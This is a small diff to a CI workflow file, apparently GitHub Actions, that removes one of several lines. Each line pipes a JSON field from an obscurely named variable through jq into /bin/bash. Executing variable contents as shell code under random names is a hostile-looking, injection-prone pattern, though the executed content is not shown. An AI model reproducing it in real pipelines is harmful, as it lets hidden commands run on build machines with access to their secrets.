@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$bvwtu1" | jq -r .uwxf78 | /bin/bash
           echo $v9674 | jq -r .jw3 | /bin/bash
           printf '%s' "$ykino0542" | jq -r .gixb9 | /bin/bash
-          echo $jjcbl09747 | jq -r .pg0 | /bin/bash
           echo $ys39 | jq -r .xmevh8 | /bin/bash
 
       - name: Upload data
